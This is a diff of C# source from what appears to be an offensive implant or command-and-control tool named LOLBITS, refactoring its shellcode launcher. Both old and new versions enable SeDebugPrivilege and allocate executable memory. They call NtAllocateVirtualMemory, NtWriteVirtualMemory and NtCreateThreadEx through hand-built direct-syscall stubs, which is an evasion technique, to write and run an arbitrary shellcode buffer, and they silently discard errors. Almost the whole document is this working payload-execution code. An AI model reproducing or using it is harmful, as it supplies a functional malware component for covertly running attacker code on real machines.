@@ -100,29 +100,29 @@ namespace LOLBITS.Controlling
 
         public static void Main(byte[] shellCode, SysCallManager sysCall, int pid)
         {
-            LauncherShellCode obj = new LauncherShellCode();
+            var obj = new LauncherShellCode();
 
-            Thread thr1 = new Thread(ExecuteShellCodeInMemory);
+            var thr1 = new Thread(ExecuteShellCodeInMemory);
 
-            object[] a = new object[] { shellCode, sysCall, pid};
+            var a = new object[] { shellCode, sysCall, pid};
 
             thr1.Start(a);
         }
 
-        public static unsafe void ExecuteShellCodeInMemory(object args)        
+        private static unsafe void ExecuteShellCodeInMemory(object args)        
         {
-            object[] parameterArguments = (object[])args;
-            byte[] sc = (byte[]) parameterArguments[0];
-            SysCallManager sysCall = (SysCallManager)parameterArguments[1];
-            int pid = (int)parameterArguments[2];
-            IntPtr handle = Process.GetCurrentProcess().Handle;
+            var parameterArguments = (object[])args;
+            var sc = (byte[]) parameterArguments[0];
+            var sysCall = (SysCallManager)parameterArguments[1];
+            var pid = (int)parameterArguments[2];
+            var handle = Process.GetCurrentProcess().Handle;
 
             if(pid != -1)
             {
-                IntPtr token = IntPtr.Zero;
+                var token = IntPtr.Zero;
                 Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, sysCall); 
 
-                List<string> l = new List<string>();
+                var l = new List<string>();
                 l.Add("SeDebugPrivilege");
                 Utils.EnablePrivileges(token, l);
 
@@ -132,61 +132,69 @@ namespace LOLBITS.Controlling
 
             try
             {
-                IntPtr baseAddr = IntPtr.Zero;
-                byte[] shellcode = sysCall.GetSysCallAsm("NtAllocateVirtualMemory");
-                var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
-                Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
-                var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtAllocateVirtualMemory));
+                var baseAddress = IntPtr.Zero;
+                var shellCode = sysCall.GetSysCallAsm("NtAllocateVirtualMemory");
+                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
+                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
+                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+                var sysCallDelegate =
+                    Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtAllocateVirtualMemory));
 
-                var arguments = new object[] { handle, baseAddr, (uint)0, (UIntPtr)(sc.Length + 1), AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite };
-                var returnValue = syscallDelegate.DynamicInvoke(arguments);
-
-                if ((int)returnValue == 0)
+                var arguments = new object[]
                 {
-                    baseAddr = (IntPtr)arguments[1]; //required!
+                    handle, baseAddress, (uint) 0, (UIntPtr) (sc.Length + 1),
+                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite
+                };
+                var returnValue = sysCallDelegate.DynamicInvoke(arguments);
 
-                    shellcode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
-                    shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
-                    Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
-                    syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtWriteVirtualMemory));
+                if ((int) returnValue != 0) return;
 
-                    arguments = new object[] { handle, baseAddr, sc, (UIntPtr)(sc.Length + 1), IntPtr.Zero };
+                baseAddress = (IntPtr) arguments[1]; //required!
 
-                    returnValue = syscallDelegate.DynamicInvoke(arguments);
-                    baseAddr = (IntPtr)arguments[1];
+                shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
+                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
+                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
+                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
 
-                    if ((int)returnValue == 0)
-                    {
+                arguments = new object[] {handle, baseAddress, sc, (UIntPtr) (sc.Length + 1), IntPtr.Zero};
 
-                        MyBuffer64 a = new MyBuffer64();
-                        MyBuffer64 b = new MyBuffer64();
+                returnValue = sysCallDelegate.DynamicInvoke(arguments);
+                baseAddress = (IntPtr) arguments[1];
 
-                        Unknown64 u = new Unknown64();
-                        u.Size = (uint)Marshal.SizeOf(u);
-                        u.Unknown1 = 65539;
-                        u.Unknown2 = 16;
-                        u.UnknownPtr = &a;
-                        u.Unknown4 = 65540;
-                        u.Unknown5 = 8;
-                        u.Unknown6 = 0;
-                        u.UnknownPtr2 = &b;
-                        u.Unknown3 = 0;
+                if ((int) returnValue != 0) return;
 
+                var a = new MyBuffer64();
+                var b = new MyBuffer64();
 
+                var u = new Unknown64();
+                u.Size = (uint) Marshal.SizeOf(u);
+                u.Unknown1 = 65539;
+                u.Unknown2 = 16;
+                u.UnknownPtr = &a;
+                u.Unknown4 = 65540;
+                u.Unknown5 = 8;
+                u.Unknown6 = 0;
+                u.UnknownPtr2 = &b;
+                u.Unknown3 = 0;
 
-                        shellcode = sysCall.GetSysCallAsm("NtCreateThreadEx");
-                        shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
-                        Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
-                        syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtCreateThreadEx64));
+                shellCode = sysCall.GetSysCallAsm("NtCreateThreadEx");
+                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
+                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
+                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtCreateThreadEx64));
 
-                        arguments = new object[] { IntPtr.Zero, 0x001FFFFF, IntPtr.Zero, handle, baseAddr, IntPtr.Zero, false, (ulong)0, (ulong)0, (ulong)0, u };
-                        returnValue = syscallDelegate.DynamicInvoke(arguments);
-
-                    }
-                }
-                
+                arguments = new object[]
+                {
+                    IntPtr.Zero, 0x001FFFFF, IntPtr.Zero, handle, baseAddress, IntPtr.Zero, false, (ulong) 0, (ulong) 0,
+                    (ulong) 0, u
+                };
+                returnValue = sysCallDelegate.DynamicInvoke(arguments);
             }
-            catch {}
+            catch
+            {
+
+            }
         }
     }
 }
